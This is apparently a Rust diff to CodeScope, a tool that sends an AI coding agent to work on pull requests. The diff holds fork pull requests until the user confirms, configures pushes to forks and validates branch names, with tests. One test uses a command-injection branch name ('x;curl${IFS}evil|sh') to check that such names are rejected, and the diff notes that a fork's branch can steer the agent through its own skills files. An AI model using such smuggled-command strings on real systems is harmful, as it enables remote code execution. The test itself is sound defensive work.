@@ -130,6 +130,21 @@ pub struct WorktreeDispatch {
     /// What CodeScope knows of a review round, from when it starts.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub review: Option<ReviewRound>,
+    /// Set for a pull request item from a fork.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub fork: Option<ForkPush>,
+}
+
+/// Where a round on a fork's pull request pushes.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "camelCase")]
+pub struct ForkPush {
+    /// The pull request's branch in the fork.
+    pub branch: String,
+    /// The fork's URL in the scheme of the project's remote; `None` when its author doesn't
+    /// allow edits by maintainers, or the fork is gone.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub url: Option<String>,
 }
 
 impl WorktreeDispatch {
@@ -207,7 +222,8 @@ pub enum Hold {
     /// A pull request item one of the user's dispatches opened, for the issue with this number:
     /// that dispatch works on it.
     OpenedByDispatch(u32),
-    /// A pull request item from a fork, whose branch brings its own skills and `CLAUDE.md`.
+    /// A pull request item from a fork whose move the user hasn't confirmed: its branch brings its
+    /// own skills and `CLAUDE.md`.
     FromFork,
     /// A session runs in the item's worktree and isn't waiting for a prompt, so the task can't
     /// be handed to it yet.
@@ -270,9 +286,10 @@ impl Hold {
             Hold::OpenedByDispatch(issue) => {
                 format!("Opened by the dispatch of #{issue}: move #{issue} to work on it")
             }
-            Hold::FromFork => "From a fork: its branch can change the agent's skills, so it \
-                               doesn't start on a move"
-                .into(),
+            Hold::FromFork => {
+                "From a fork: its branch steers the agent, so it starts only once you confirm"
+                    .into()
+            }
             Hold::SessionBusy => "Waits for the session in its worktree to be idle".into(),
             Hold::UnsentInput => {
                 "Waits for Enter in its session's tab: something was typed there".into()
@@ -322,6 +339,8 @@ pub struct Facts<'a> {
     pub head: Option<&'a PullRequestHead>,
     /// For a pull request item: the issue whose dispatch of the user's opened it.
     pub opened_by: Option<u32>,
+    /// For a pull request item from a fork: the time of the move the user confirmed it for.
+    pub fork_confirmed: Option<&'a str>,
     /// This user's dispatches that are running now.
     pub running: usize,
     pub limit: usize,
@@ -381,8 +400,10 @@ fn check(
     if !assigned_to_viewer && let Some(other) = item.assignees.first() {
         return Err(Hold::AssignedToOther(other.clone()));
     }
-    if item.kind == ItemKind::PullRequest {
-        check_pull_request_item(facts)?;
+    if item.kind == ItemKind::PullRequest
+        && let Some(issue) = facts.opened_by
+    {
+        return Err(Hold::OpenedByDispatch(issue));
     }
 
     let column = item
@@ -430,18 +451,15 @@ fn check(
     if mapped_column(board, mapping, round.progress_role()).is_none() {
         return Err(Hold::NoProgressColumn(round.progress_role()));
     }
+    let from_fork = facts.head.is_some_and(|head| head.is_cross_repository);
+    if item.kind == ItemKind::PullRequest
+        && from_fork
+        && facts.fork_confirmed != Some(change.created_at.as_str())
+    {
+        return Err(Hold::FromFork);
+    }
     if facts.running >= facts.limit {
         return Err(Hold::LimitReached(facts.limit));
-    }
-    Ok(())
-}
-
-fn check_pull_request_item(facts: &Facts) -> Result<(), Hold> {
-    if let Some(issue) = facts.opened_by {
-        return Err(Hold::OpenedByDispatch(issue));
-    }
-    if facts.head.is_some_and(|head| head.is_cross_repository) {
-        return Err(Hold::FromFork);
     }
     Ok(())
 }
@@ -809,6 +827,25 @@ fn built_in_work(round: Round, kind: ItemKind, pull_request_named: bool) -> Stri
     }
 }
 
+fn push_rule(fork: Option<&ForkPush>) -> String {
+    match fork {
+        None => {
+            "Push the fixes to the pull request's branch; don't open another pull request."
+                .to_string()
+        }
+        Some(ForkPush { url: Some(_), .. }) => {
+            "Push the fixes to the pull request's branch with a plain `git push`: CodeScope set \
+             this branch up to push to its fork. Don't open another pull request."
+                .to_string()
+        }
+        Some(ForkPush { url: None, .. }) => format!(
+            "You can't push to this pull request: it comes from a fork that doesn't take pushes \
+             from you. Commit nothing, and write what you would change to `{REPLY_FILE}` for its \
+             author."
+        ),
+    }
+}
+
 fn handover_rules(dispatch: &WorktreeDispatch, pr_number: &str, researched: bool) -> Vec<String> {
     let WorktreeDispatch {
         round,
@@ -857,8 +894,7 @@ fn handover_rules(dispatch: &WorktreeDispatch, pr_number: &str, researched: bool
                 "Before you change anything, pull the pull request's branch: someone may have \
                  pushed to it since, such as a reviewer committing a suggestion."
                     .to_string(),
-                "Push the fixes to the pull request's branch; don't open another pull request."
-                    .to_string(),
+                push_rule(dispatch.fork.as_ref()),
                 format!(
                     "You may reply in the review threads you handle, with `gh api --hostname \
                      github.com repos/{repository}/pulls/{pr_number}/comments/<id>/replies -f \
@@ -1021,6 +1057,109 @@ pub fn add_pull_request_worktree(
     run_git(repo, &["config", &format!("branch.{branch}.merge"), &merge]).map(|_| ())
 }
 
+/// The local branch a fork's pull request `number` is worked on: `<owner>/<branch>`, or
+/// `pull/<number>` once the fork is gone.
+pub fn fork_branch(number: u32, head: &PullRequestHead) -> String {
+    let owner = head
+        .repository
+        .as_deref()
+        .and_then(|repository| repository.split_once('/'))
+        .map(|(owner, _)| owner)
+        .filter(|owner| is_plain_branch(owner) && is_plain_branch(&head.branch));
+    match owner {
+        Some(owner) => format!("{owner}/{}", head.branch),
+        None => format!("pull/{number}"),
+    }
+}
+
+/// `remote_url` with its repository replaced by `fork`, `owner/name`, and without the user and
+/// password of an HTTPS URL; `None` when it isn't a GitHub remote.
+pub fn fork_url(remote_url: &str, fork: &str) -> Option<String> {
+    let repository = repository_from_remote(remote_url)?;
+    let url = remote_url.trim().trim_end_matches('/');
+    let (url, suffix) = match url.strip_suffix(".git") {
+        Some(url) => (url, ".git"),
+        None => (url, ""),
+    };
+    let prefix = url.strip_suffix(repository.as_str())?;
+    let web = ["https://", "http://"]
+        .into_iter()
+        .find(|scheme| prefix.starts_with(scheme));
+    match web {
+        Some(scheme) => Some(format!("{scheme}github.com/{fork}{suffix}")),
+        None => Some(format!("{prefix}{fork}{suffix}")),
+    }
+}
+
+/// Whether `branch` has only letters, digits, `-`, `_`, `.` and `/`, so it can go into a path
+/// and a command as it is.
+pub fn is_plain_branch(branch: &str) -> bool {
+    !branch.is_empty()
+        && branch
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/'))
+}
+
+/// Where a round on the fork pull request `head` pushes, given the URL of the project's remote:
+/// a URL only when its author allows edits by maintainers and its branch is plain.
+pub fn fork_push(head: &PullRequestHead, remote_url: &str) -> ForkPush {
+    let url = head
+        .repository
+        .as_deref()
+        .filter(|_| head.maintainer_can_modify && is_plain_branch(&head.branch))
+        .and_then(|fork| fork_url(remote_url, fork));
+    ForkPush {
+        branch: head.branch.clone(),
+        url,
+    }
+}
+
+/// Create the worktree of a fork's pull request `number` at `path` on the local `branch`, from
+/// the pull request's head as `remote` has it; `git pull` there takes that head again.
+pub fn add_fork_worktree(
+    repo: &Path,
+    path: &Path,
+    branch: &str,
+    remote: &str,
+    number: u32,
+) -> Result<()> {
+    let base = fetch_pull(repo, remote, number)?;
+    add_worktree_from(repo, path, branch, &base, &format!("pull request #{number}"))?;
+    run_git(repo, &["config", &format!("branch.{branch}.remote"), remote])?;
+    let merge = format!("refs/pull/{number}/head");
+    run_git(repo, &["config", &format!("branch.{branch}.merge"), &merge]).map(|_| ())
+}
+
+/// Point a plain `git push` on the local `branch` of fork pull request `number` at the fork's
+/// branch through the remote `pr-<number>`, or take that away when `fork` has no URL.
+pub fn set_fork_push(repo: &Path, branch: &str, number: u32, fork: &ForkPush) -> Result<()> {
+    let remote = format!("pr-{number}");
+    let push_remote = format!("branch.{branch}.pushRemote");
+    let Some(url) = &fork.url else {
+        let _ = run_git(repo, &["config", "--unset", &push_remote]);
+        let _ = run_git(repo, &["config", "--remove-section", &format!("remote.{remote}")]);
+        return Ok(());
+    };
+    run_git(repo, &["config", &format!("remote.{remote}.url"), url])?;
+    let refspec = format!("refs/heads/{branch}:refs/heads/{}", fork.branch);
+    run_git(repo, &["config", "--replace-all", &format!("remote.{remote}.push"), &refspec])?;
+    run_git(repo, &["config", &push_remote, &remote]).map(|_| ())
+}
+
+/// The commit pull request `number`'s head is at on `remote`, fetched now.
+pub fn fetch_pull_head(repo: &Path, remote: &str, number: u32) -> Result<String> {
+    let fetched = fetch_pull(repo, remote, number)?;
+    let output = run_git(repo, &["rev-parse", &fetched])?;
+    Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
+}
+
+fn fetch_pull(repo: &Path, remote: &str, number: u32) -> Result<String> {
+    let fetched = format!("refs/remotes/{remote}/pull/{number}");
+    let refspec = format!("+refs/pull/{number}/head:{fetched}");
+    run_git(repo, &["fetch", "--quiet", remote, &refspec])?;
+    Ok(fetched)
+}
+
 /// The commit `branch` of `remote` points at, fetched now.
 pub fn fetch_branch_head(repo: &Path, remote: &str, branch: &str) -> Result<String> {
     let fetched = fetch_branch(repo, remote, branch)?;
@@ -1175,6 +1314,7 @@ mod tests {
             branch: None,
             head: None,
             opened_by: None,
+            fork_confirmed: None,
             running: 0,
             limit: DEFAULT_DISPATCH_LIMIT,
         }
@@ -1206,6 +1346,7 @@ mod tests {
             findings: None,
             pull_request: None,
             review: None,
+            fork: None,
         }
     }
 
@@ -1222,9 +1363,19 @@ mod tests {
     }
 
     fn pr_head(branch: &str, is_cross_repository: bool) -> PullRequestHead {
+        let repository = if is_cross_repository { "octo/CodeScope" } else { "maui1911/CodeScope" };
         PullRequestHead {
             branch: branch.into(),
             is_cross_repository,
+            repository: Some(repository.into()),
+            maintainer_can_modify: false,
+        }
+    }
+
+    fn fork_head(maintainer_can_modify: bool) -> PullRequestHead {
+        PullRequestHead {
+            maintainer_can_modify,
+            ..pr_head("main", true)
         }
     }
 
@@ -1602,8 +1753,142 @@ mod tests {
         );
         assert_eq!(
             Hold::FromFork.label(),
-            "From a fork: its branch can change the agent's skills, so it doesn't start on a move"
+            "From a fork: its branch steers the agent, so it starts only once you confirm"
         );
+    }
+
+    #[test]
+    fn a_fork_s_pull_request_starts_once_the_user_confirms_that_move() {
+        let change = moved_by(VIEWER, "Ready");
+        let fork = fork_head(true);
+        let waiting = Facts {
+            head: Some(&fork),
+            ..facts(&change)
+        };
+        assert_eq!(run_decide(pull_request_in("y"), &waiting), Some(Err(Hold::FromFork)));
+        let confirmed = Facts {
+            fork_confirmed: Some(MOVED),
+            ..waiting
+        };
+        assert_eq!(run_decide(pull_request_in("y"), &confirmed), Some(Ok(Round::Review)));
+        let earlier = Facts {
+            fork_confirmed: Some("2026-11-25T09:45:00Z"),
+            ..waiting
+        };
+        assert_eq!(
+            run_decide(pull_request_in("y"), &earlier),
+            Some(Err(Hold::FromFork)),
+            "a confirmation starts the one move it was given for"
+        );
+
+        let research = moved_by(VIEWER, "Research");
+        let confirmed_research = Facts {
+            head: Some(&fork),
+            fork_confirmed: Some(MOVED),
+            ..facts(&research)
+        };
+        assert_eq!(
+            run_decide(pull_request_in("r"), &confirmed_research),
+            Some(Ok(Round::Research))
+        );
+
+        let theirs = moved_by("sanne", "Ready");
+        let moved_by_other = Facts {
+            head: Some(&fork),
+            ..facts(&theirs)
+        };
+        assert_eq!(
+            run_decide(pull_request_in("y"), &moved_by_other),
+            Some(Err(Hold::MovedByOther("sanne".into()))),
+            "it asks only for a move that would start"
+        );
+    }
+
+    #[test]
+    fn a_fork_s_pull_request_gets_a_local_branch_and_a_push_url_of_its_own() {
+        assert_eq!(fork_branch(421, &fork_head(true)), "octo/main");
+        let gone = PullRequestHead {
+            repository: None,
+            ..fork_head(true)
+        };
+        assert_eq!(fork_branch(421, &gone), "pull/421");
+        let fork = "octo/CodeScope";
+        assert_eq!(
+            fork_url("git@github.com:maui1911/CodeScope.git", fork).as_deref(),
+            Some("git@github.com:octo/CodeScope.git")
+        );
+        assert_eq!(
+            fork_url("https://github.com/maui1911/CodeScope", fork).as_deref(),
+            Some("https://github.com/octo/CodeScope")
+        );
+        assert_eq!(
+            fork_url("ssh://git@github.com/Maui1911/codescope.git/", fork).as_deref(),
+            Some("ssh://git@github.com/octo/CodeScope.git")
+        );
+        assert_eq!(
+            fork_url("https://maui1911:ghp_secret@github.com/maui1911/CodeScope.git", fork)
+                .as_deref(),
+            Some("https://github.com/octo/CodeScope.git"),
+            "a token in the remote stays out of the task"
+        );
+        assert_eq!(fork_url("https://gitlab.com/maui1911/CodeScope", fork), None);
+
+        let odd = PullRequestHead {
+            branch: "x;curl${IFS}evil|sh".into(),
+            ..fork_head(true)
+        };
+        assert_eq!(fork_branch(421, &odd), "pull/421", "a branch name that isn't plain");
+        assert!(is_plain_branch("fix/palette-2.1_b") && !is_plain_branch(""));
+        let remote = "git@github.com:maui1911/CodeScope.git";
+        assert_eq!(
+            fork_push(&fork_head(true), remote),
+            ForkPush {
+                branch: "main".into(),
+                url: Some("git@github.com:octo/CodeScope.git".into()),
+            }
+        );
+        assert_eq!(fork_push(&fork_head(false), remote).url, None, "no edits by maintainers");
+        assert_eq!(fork_push(&gone, remote).url, None, "the fork is gone");
+        assert_eq!(fork_push(&odd, remote).url, None, "it would go into a command");
+    }
+
+    #[test]
+    fn the_review_task_of_a_fork_s_pull_request_says_where_to_push() {
+        let mut record = pull_request_record(Round::Review);
+        record.fork = Some(ForkPush {
+            branch: "main".into(),
+            url: Some("git@github.com:octo/CodeScope.git".into()),
+        });
+        let task = task_file(&record, None, None);
+        assert!(
+            task.contains(
+                "Push the fixes to the pull request's branch with a plain `git push`: CodeScope \
+                 set this branch up to push to its fork. Don't open another pull request."
+            ),
+            "{task}"
+        );
+        assert!(!task.contains("git@github.com"), "{task}");
+        assert!(!task.contains("Push the fixes to the pull request's branch;"), "{task}");
+
+        record.fork = Some(ForkPush {
+            branch: "main".into(),
+            url: None,
+        });
+        let task = task_file(&record, None, None);
+        assert!(
+            task.contains(
+                "You can't push to this pull request: it comes from a fork that doesn't take \
+                 pushes from you."
+            ),
+            "{task}"
+        );
+        assert!(!task.contains("git push"), "{task}");
+
+        let json = serde_json::to_string(&record).unwrap();
+        assert!(json.contains(r#""fork":{"branch":"main"}"#), "{json}");
+        assert_eq!(serde_json::from_str::<WorktreeDispatch>(&json).unwrap(), record);
+        let issue = serde_json::to_string(&dispatch(Round::Research, MOVED)).unwrap();
+        assert!(!issue.contains("fork"), "{issue}");
     }
 
     #[test]
@@ -2491,6 +2776,71 @@ mod tests {
         git(&repo, &["config", "user.email", "test@example.invalid"]);
         git(&repo, &["config", "user.name", "Test"]);
         (upstream, repo)
+    }
+
+    #[test]
+    fn a_fork_s_worktree_takes_the_pull_request_s_head_and_pulls_from_it() {
+        if no_window_command("git").arg("--version").output().is_err() {
+            return;
+        }
+        let dir = tempfile::tempdir().unwrap();
+        let (upstream, repo) = upstream_with_branch(dir.path(), "theirs");
+        let first = head(&upstream, "theirs");
+        git(&upstream, &["update-ref", "refs/pull/421/head", &first]);
+
+        let path = dir.path().join("repo.worktrees").join("octo-main");
+        add_fork_worktree(&repo, &path, "octo/main", "origin", 421).unwrap();
+        assert_eq!(head(&path, "HEAD"), first);
+        let merge = run_git(&repo, &["config", "branch.octo/main.merge"]).unwrap();
+        assert_eq!(String::from_utf8_lossy(&merge.stdout).trim(), "refs/pull/421/head");
+        assert!(
+            run_git(&repo, &["config", "branch.octo/main.pushRemote"]).is_err(),
+            "set_fork_push sets it"
+        );
+
+        git(&upstream, &["checkout", "-q", "theirs"]);
+        git(&upstream, &["commit", "--allow-empty", "-m", "pushed to the fork", "-q"]);
+        git(&upstream, &["checkout", "-q", "main"]);
+        let pushed = head(&upstream, "theirs");
+        git(&upstream, &["update-ref", "refs/pull/421/head", &pushed]);
+        assert_eq!(fetch_pull_head(&repo, "origin", 421).unwrap(), pushed);
+        git(&path, &["pull", "--ff-only", "-q"]);
+        assert_eq!(head(&path, "HEAD"), pushed, "git pull follows the pull request");
+    }
+
+    #[test]
+    fn a_plain_push_in_a_fork_s_worktree_reaches_its_branch_only_when_the_fork_takes_pushes() {
+        if no_window_command("git").arg("--version").output().is_err() {
+            return;
+        }
+        let dir = tempfile::tempdir().unwrap();
+        let (upstream, repo) = upstream_with_branch(dir.path(), "theirs");
+        let first = head(&upstream, "theirs");
+        git(&upstream, &["update-ref", "refs/pull/421/head", &first]);
+        git(dir.path(), &["clone", "-q", "--bare", "upstream", "fork.git"]);
+        let fork = dir.path().join("fork.git");
+        let path = dir.path().join("repo.worktrees").join("octo-theirs");
+        add_fork_worktree(&repo, &path, "octo/theirs", "origin", 421).unwrap();
+
+        let push = ForkPush {
+            branch: "theirs".into(),
+            url: Some(fork.to_string_lossy().into_owned()),
+        };
+        set_fork_push(&repo, "octo/theirs", 421, &push).unwrap();
+        set_fork_push(&repo, "octo/theirs", 421, &push).unwrap();
+        git(&path, &["commit", "--allow-empty", "-m", "a fix", "-q"]);
+        git(&path, &["push", "-q"]);
+        assert_eq!(head(&fork, "theirs"), head(&path, "HEAD"), "on the fork's branch");
+        assert!(
+            run_git(&fork, &["rev-parse", "--verify", "-q", "refs/heads/octo/theirs"]).is_err(),
+            "not under the local name"
+        );
+
+        let closed = ForkPush { url: None, ..push };
+        set_fork_push(&repo, "octo/theirs", 421, &closed).unwrap();
+        assert!(run_git(&repo, &["config", "branch.octo/theirs.pushRemote"]).is_err());
+        assert!(run_git(&repo, &["config", "remote.pr-421.url"]).is_err());
+        set_fork_push(&repo, "octo/theirs", 421, &closed).unwrap();
     }
 
     #[test]
